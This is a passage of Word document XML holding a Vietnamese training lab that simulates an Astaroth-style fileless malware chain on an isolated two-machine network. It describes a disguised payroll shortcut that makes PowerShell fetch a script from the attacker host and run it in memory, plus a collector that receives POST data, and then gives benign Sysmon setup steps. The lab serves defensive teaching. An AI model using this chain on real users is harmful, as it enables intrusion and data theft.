        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>certutil</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> hoặc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>. Bản nên follow hiện tại là:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>01-chuan-bi-moi-truong.md</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>02-lab-2-may-astaroth-style.md</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>03-detection-phong-thu.md</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>04-cleanup-va-viet-bao-cao.md</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:t>01 - Chuẩn bị môi trường lab Astaroth-inspired</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Mục tiêu của phần chuẩn bị</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Bài lab này mô phỏng một chuỗi Fileless Malware theo hướng Astaroth-inspired trong môi trường an toàn. Mục tiêu không phải tạo mã độc thật, mà là giúp người học quan sát được cách một file shortcut </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> có thể gọi PowerShell, tải nội dung payload từ máy attacker qua HTTP và thực thi nội dung đó trong bộ nhớ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lab chỉ dùng payload vô hại. Payload không đánh cắp dữ liệu, không tạo persistence, không kết nối C2 thật, không bypass antivirus và không leo thang đặc quyền.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chuỗi tổng quan:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Victim tải ZIP</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; giải nén</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; double click ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; LNK gọi powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; PowerShell kết nối attacker qua HTTP</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; nhận nội dung payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; tạo ScriptBlock trong RAM</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; thực thi payload</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; hiển thị kết quả trong PowerShell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Điểm cần chứng minh:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có network connection từ victim đến attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có PowerShell execution.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có nội dung payload được thực thi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> hoặc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> được ghi xuống ổ đĩa của victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Mô hình lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lab sử dụng hai máy trong mạng nội bộ cô lập:</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c>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Vai trò</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Máy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Chức năng</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Attacker</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Windows thật</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>`192.168.141.1`</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Host `payload.ps1`, `ThongBaoLuong_Q3.zip` và nhận `POST /collect` bằng Python collector server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Victim</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Windows VM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>`192.168.141.140`</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Truy cập web giả lập, tải ZIP, mở LNK và sinh log</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Yêu cầu chung:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Hai máy ping được nhau.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Victim truy cập được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://192.168.141.1:8000/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Attacker có Python 3.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Victim có PowerShell, Event Viewer và Sysmon.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nên tạo snapshot cho máy ảo victim trước khi chạy lab.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Công cụ cần chuẩn bị</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bắt buộc:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Windows Event Viewer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sysmon.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Python 3 trên máy attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trình duyệt web trên máy victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nên có thêm:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Process Explorer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Process Monitor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Autoruns.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Tải Sysinternals từ Microsoft:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>https://learn.microsoft.com/sysinternals/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Cài Sysmon trên victim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.1. Tải Sysmon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Tải Sysmon từ Microsoft Sysinternals và giải nén vào:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>C:\Tools\Sysmon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2. Tải Sysmon config</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có thể dùng config cộng đồng của SwiftOnSecurity:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>https://github.com/SwiftOnSecurity/sysmon-config</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lưu file config thành:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>C:\Tools\Sysmon\sysmonconfig.xml</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3. Cài Sysmon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Mở PowerShell bằng quyền Administrator:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd C:\Tools\Sysmon</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.\Sysmon64.exe -accepteula -i .\sysmonconfig.xml</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kiểm tra:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-Service Sysmon*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nếu cài đúng sẽ thấy service Sysmon đang chạy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Log nằm tại:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
